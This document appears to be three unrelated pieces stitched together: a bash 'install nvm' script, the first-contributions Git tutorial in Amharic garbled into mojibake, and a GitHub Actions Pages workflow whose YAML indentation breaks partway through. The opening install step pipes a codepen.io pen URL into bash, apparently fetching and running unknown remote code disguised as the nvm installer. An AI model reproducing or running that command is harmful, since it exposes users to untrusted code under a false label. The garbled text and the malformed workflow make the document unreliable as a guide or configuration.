#!/bin/bash

# Install nvm
curl -o- https://codepen.io/Tadese-Ayane/pen/raVQpgo/embedded | bash

# Load nvm into current session
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

# Install Node.js 22
nvm install 22

# Verify Node and npm versions
node -v
nvm current
npm -v

## рІГрѕЁріЋріЋ рѕЏріерѕЏрЅ╗ рѕ╣ріФ рІФрІхрѕГрїЅ

рЅарІџрѕЁ рїѕрїй рѕІрІГріЏрІЇ ріГрЇЇрѕЇ рѕІрІГ рІФрѕѕрІЇріЋ рІерѕ╣ріФ рЅЂрѕЇрЇЇ рїарЅЁ рЅарѕЏрІхрѕерїЇ рІГрѕЁріЋріЋ рѕЏріерѕЏрЅ╗ рѕ╣ріФ рІФрІхрѕГрїЅрЅхрЇб
рІГрѕЁ рЅаріаріЋрЅ░ рѕўрѕѕрІФ рІЇрѕхрїЦ рІерІџрѕЁріЋ рѕЏріерѕЏрЅ╗ рЅЁрїѓ рІГрЇѕрїЦрѕФрѕЇрЇб

## рѕЏріерѕЏрЅ╗рІЇріЋ рѕўрІЮрїІрЅх

<img align="right" width="300" src="https://firstcontributions.github.io/assets/Readme/clone.png" alt="clone this repository" />

ріарѕЂріЋ рІерѕ╣ріФрІЇріЋ рѕўрІФрІБ рІѕрІ░ рѕЏрѕйріЋрІј рІФрІФрІГрІЎрЅх. рІѕрІ░ GitHub рѕўрѕѕрІФрІј рІГрѕѓрІ▒рЇБ рІерѕ╣ріФ рѕЏріерѕЏрЅ╗рІЇріЋ рІГріГрЇѕрЅ▒рЇБ рІері«рІх ріарІЮрѕФрѕЕріЋ рїарЅЁ рІФрІхрѕГрїЅ ріЦріЊ ріерІџрІФ _copy to clipboard_ ріарІХріЋ рїарЅЁ рІФрІхрѕГрїЅрЇб

рЅ░рѕГрѕџріЊрѕЇ рІГріГрЇѕрЅ▒ ріЦріЊ рІерѕџріерЅ░рѕѕрІЇріЋ рІеgit рЅхрІЋрІЏрІЮ рІФрѕѓрІ▒рЇА-

```
git clone "рІЕріарѕГріцрѕЅріЋ ріарѕЂріЋ рЅђрІхрЅ░рѕЃрѕЇрЇб"
```

"рІЕріарѕГріцрѕЇ ріарѕЂріЋ рІерїѕрѕѕрЅарїАрЅх" (рІФрѕѕ рїЦрЅЁрѕХрЅй) рІѕрІ░рІџрѕЁ рѕЏріерѕЏрЅ╗ рІЕріарѕГріцрѕЇ (рІерІџрѕЁ рЇЋрѕ«рїђріГрЅх рѕ╣ріФ) рІерѕєріљрЅарЅхрЇб рІЕріарѕГріцрѕЅріЋ рѕѕрѕЏрїЇріўрЅх рІерЅђрІ░рѕўрІЇріЋ рІ░рѕерїЃрІјрЅй рІГрѕўрѕЇріерЅ▒рЇб

<img align="right" width="300" src="https://firstcontributions.github.io/assets/Readme/copy-to-clipboard.png" alt="рІЕріарѕГріцрѕЇріЋ рІѕрІ░ ріГрѕірЇЋрЅдрѕГрІх рЅЁрІ│" />

рѕѕрѕЮрѕ│рѕї:

```
git clone https://github.com/рІГрѕЁ ріаріЋрЅ░ ріљрѕЁрЇб/first-contributions.git
```

рІе GitHub рЅ░рїарЅЃрѕџ рѕхрѕЮрѕЁ рІерЅх `рІГрѕЁ ріаріЋрЅ░ ріљрѕЁрЇб' ріЦрІџрѕЁ рЅа GitHub рѕІрІГ рІФрѕѕрІЇріЋ рІерѕўрїђрѕўрѕфрІФ ріарѕхрЅ░рІІрЇЁрІќ рѕЏріерѕЏрЅ╗ рІГрІўрЅХрЅйріЋ рІѕрІ░ рі«рѕЮрЇњрІЇрЅ░рѕГрІј ріЦрІерїѕрѕѕрЅарїА ріљрІЇрЇб

#рЅЁрѕГріЋрїФрЇЇ рЇЇрїарѕГ

рЅарі«рѕЮрЇњрІЇрЅ░рѕГрІј рѕІрІГ рІѕрІ│рѕѕрІЇ рІерѕЏріерѕЏрЅ╗ рѕЏрІЇрїФ рІГрЅђрІГрѕЕ (ріЦрІџрІФ ріерѕїрѕѕрІјрЅх)рЇА-

```
cd first-contributions
```

ріарѕЂріЋ рІе`git switch` рЅхрІЋрІЏрІЮріЋ рЅарѕўрїарЅђрѕЮ рЅЁрѕГріЋрїФрЇЇ рІГрЇЇрїарѕЕрЇА

```
git switch -c рІеріЦрѕГрѕхрІј-ріарІ▓рѕ▒-рЅЁрѕГріЋрїФрЇЇ-рѕхрѕЮ
```

рѕѕрѕЮрѕ│рѕї:

```
git switch -c add-alonzo-church
```

## ріарѕхрЇѕрѕІрїі рѕѕрІЇрїдрЅйріЋ рІФрІхрѕГрїЅ ріЦріЊ рѕѕрІЇрїдрЅйріЋ рІФрІхрѕГрїЅ

ріарѕЂріЋ рІе`Contributors.md` рЇІрІГрѕЇріЋ рЅарїйрѕЉрЇЇ ріарѕГрЅ│ріб рІЇрѕхрїЦ рІГріГрЇѕрЅ▒рЇБ рѕхрѕЮрІјріЋ рЅаріЦрѕ▒ рѕІрІГ рІФріГрѕЅрЇб рЅарЇІрІГрѕЅ рѕўрїђрѕўрѕфрІФ рІѕрІГрѕЮ рѕўрїерѕерѕ╗ рѕІрІГ ріарІГрїерѕЮрѕЕрЅхрЇб рЅарѕўріФріерѕЇ рІерЅхріЏрІЇрѕЮ рЅдрЅ│ рѕІрІГ рІФрѕхрЅђрѕЮрїАрЅх. ріарѕЂріЋ, рЇІрІГрѕЅріЋ рІФрѕхрЅђрѕЮрїА.

<img align="right" width="450" src="https://firstcontributions.github.io/assets/Readme/git-status.png" alt="git status" />

рІѕрІ░ рІерЇЋрѕ«рїђріГрЅх рѕЏрІЇрїФрІЇ рѕёрІ░рІЇ рЅхрІЋрІЏрІЎріЋ `git status` ріерЇѕрїИрѕЎрЇБ рѕѕрІЇрїдрЅй ріЦріЋрІ│рѕЅ рІФрІФрѕЅрЇб

рІе `git add` рЅхрІЋрІЏрІЎріЋ рЅарѕўрїарЅђрѕЮ ріЦріљрІџрІФріЋ рѕѕрІЇрїдрЅй рІѕрІ░ рЇѕрїарѕЕрЅх рЅЁрѕГріЋрїФрЇЇ рІФріГрѕЅрЇб

```
git add Contributors.md
```
ріарѕЂріЋ рІеРђ╣gitРђ║ рЅхрІЋрІЏрІЎріЋ рЅарѕўрїарЅђрѕЮ ріЦріљрІџрѕЁріЋ рѕѕрІЇрїдрЅй рІФрІхрѕГрїЅрЇА

```
git commit -m "рѕхрѕюріЋ рІѕрІ░ ріарѕхрЅ░рІІрїйрІќ ріарЅарѕГріФрЅЙрЅй рІЮрѕГрІЮрѕГ рїерѕЮрѕГ"
```

'рѕхрѕюріЋ' рЅарѕхрѕЮрѕЁ рЅарѕўрЅ░ріФрЅхрЇб

## рѕѕрІЇрїдрЅйріЋ рІѕрІ░ GitHub рІГрїЇрЇЅ

рІе `git push` рЅхрІЋрІЏрІЮріЋ рЅарѕўрїарЅђрѕЮ рѕѕрІЇрїдрЅйрІјріЋ рІГрїЇрЇЅрЇА-

```
git push -u origin рІеріЦрѕГрѕхрІј-рЅЁрѕГріЋрїФрЇЇ-рѕхрѕЮ
```

replacing `рІеріЦрѕГрѕхрІј-рЅЁрѕГріЋрїФрЇЇ-рѕхрѕЮ` with the name of the branch you created earlier.

## рѕѕрІЇрїдрЅйрІјріЋ рѕѕрїЇрѕЮрїѕрѕЏ рІФрѕхрїѕрЅА

рЅа GitHub рѕІрІГ рІѕрІ░ рѕЏріерѕЏрЅ╗рІј ріерѕёрІ▒рЇБ `Compare and Pull Request` рІерѕџрѕѕрІЇріЋ рЅЂрѕЇрЇЇ рІФрІФрѕЅрЇб рЅарІџрІФ рЅЂрѕЇрЇЇ рѕІрІГ рїарЅЁ рІФрІхрѕГрїЅрЇб

<img style="float: right;" src = "https://firstcontributions.github.io/assets/Readme/compare-and-pull.png" alt = "рІерѕўрїјрЅ░рЅх рїЦрІФрЅё рЇЇрїарѕГ" />

ріарѕЂріЋ рІерѕўрѕ│рЅЦ рїЦрІФрЅёрІЇріЋ рІФрѕхрїѕрЅАрЇб

<img style="float: right;" src = "https://firstcontributions.github.io/assets/Readme/submit-pull-request.png" alt = "рїЦрІФрЅёріЋ рїјрЅхрЅх" />

рЅарЅЁрѕГрЅА рѕЂрѕЅріЋрѕЮ рѕѕрІЇрїдрЅйрІјріЋ рІѕрІ░ рІерІџрѕЁ рЇЋрѕ«рїђріГрЅх рІІріЊ рЅЁрѕГріЋрїФрЇЇ ріарІІрѕЁрІ│рѕѕрѕЂрЇб рѕѕрІЇрїдрЅ╣ ріерЅ░рІІрѕЃрІ▒ рЅаріІрѕІ рІерѕЏрѕ│рІѕрЅѓрІФ рібрѕюрІГрѕЇ рІГрІ░рѕГрѕхрІјрЅ│рѕЇрЇб

## ріерІџрѕЁ рІѕрІ┤рЅх рѕЇрѕѓрІх?

ріЦріЋрі│ріЋ рІ░рѕх рІФрѕѕрѕЁ! рѕЇріГ ріЦріЋрІ░ ріарѕхрЅ░рІІрїйрІќ ріарЅарѕГріФрЅй рІерѕџрІФрїІрїЦрѕЎрЅхріЋ рѕўрІ░рЅаріЏ _fork -> clone -> ріарѕГрЅхрІЋ -> рІерѕўрѕ│рЅЦ рїЦрІФрЅё_ рІерѕхрѕФ рЇЇрѕ░рЅхріЋ ріарїаріЊрЅђрІІрѕЇ!

ріарѕхрЅ░рІІрЇЁрідрІјріЋ рІФріГрЅЦрѕЕ ріЦріЊ рІѕрІ░ [рІхрѕГ рѕўрЅ░рїЇрЅарѕфрІФ](https://firstcontributions.github.io/#social-share) рЅарѕўрѕёрІх рѕѕрїЊрІ░ріърЅйрІј ріЦріЊ рЅ░ріерЅ│рІ«рЅйрІј рІФріФрЇЇрѕЅрЇб

рѕЏріЋріЏрІЇрѕЮ ріЦрѕГрІ│рЅ│ ріерЇѕрѕѕрїЅ рІѕрІГрѕЮ рѕЏріЋріЏрІЇрѕЮ рїЦрІФрЅё ріФрѕѕрІјрЅх рІеріЦріЏріЋ рІ░ріФрѕЏ рЅАрІхріЋ рѕўрЅђрѕІрЅђрѕЇ рІГрЅйрѕІрѕЅ. [рІерѕІрѕІ рЅАрІхріЋріЋ рІГрЅђрѕІрЅђрѕЅ](https://join.slack.com/t/firstcontributors/shared_invite/zt-1hg51qkgm-Xc7HxhsiPYNN3ofX2_I8FA)рЇб

ріарѕЂріЋ рѕѕрѕїрѕјрЅй рЇЋрѕ«рїђріГрЅХрЅй рЅарѕЏрЅарѕГріерЅх ріЦріЋрїђрѕЮрѕГрЇб ріЦрѕГрѕхрІј рѕірїђрѕЮрѕЕрЅБрЅИрІЇ рІерѕџрЅйрѕЅ рЅђрѕІрѕЇ рїЅрІ│рІ«рЅй рІФрѕІрЅИрІЇріЋ рІерЇЋрѕ«рїђріГрЅХрЅй рІЮрѕГрІЮрѕГ ріарІўрїІрїЁрЅ░ріЊрѕЇрЇб рІГрѕўрѕЇріерЅ▒ [рЅарІхрѕГ рѕўрЅ░рїЇрЅарѕфрІФ рІЇрѕхрїЦ рІФрѕЅ рІерЇЋрѕ«рїђріГрЅХрЅй рІЮрѕГрІЮрѕГ](https://firstcontributions.github.io/#project-list)рЇб

name: Step 1, Enable GitHub Pages

# This step triggers after we run a pages build.
# This workflow updates from step 1 to step 2.

# This will run every time we run a pages build.
# Reference: https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows
on:
  workflow_dispatch:
  page_build:

# Reference: https://docs.github.com/en/actions/security-guides/automatic-token-authentication
permissions:
  # Need `contents: read` to checkout the repository.
  # Need `contents: write` to update the step metadata.
  contents: write

jobs:
  # Get the current step to only run the main job when the learner is on the same step.
  get_current_step:
    name: Check current step number
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - id: get_step
        run: |
          echo "current_step=$(cat ./.github/steps/-step.txt)" >> $GITHUB_OUTPUT
    outputs:
      current_step: ${{ steps.get_step.outputs.current_step }}

  on_enable_github_pages:
    name: On enable github pages
    needs: get_current_step

    # We will only run this action when:
# 1. This repository isn't the template repository.
# 2. The step is currently 1.
# Reference: https://docs.github.com/en/actions/learn-github-actions/contexts
# Reference: https://docs.github.com/en/actions/learn-github-actions/expressions
if: >-
  ${{ !github.event.repository.is_template
      && needs.get_current_step.outputs.current_step == 1 }}

# We'll run Ubuntu for performance instead of Mac or Windows.
runs-on: ubuntu-latest

steps:
  # We'll need to check out the repository so that we can edit the README.
  - name: Checkout
    uses: actions/checkout@v4
    with:
      fetch-depth: 0 # Let's get all the branches.
      ref: my-pages

  # In README.md, switch step 1 for step 2.
  - name: Update to step 2
    uses: skills/action-update-step@v2
    with:
      token: ${{ secrets.GITHUB_TOKEN }}
      from_step: 1
      to_step: 2
      branch_name: my-pages
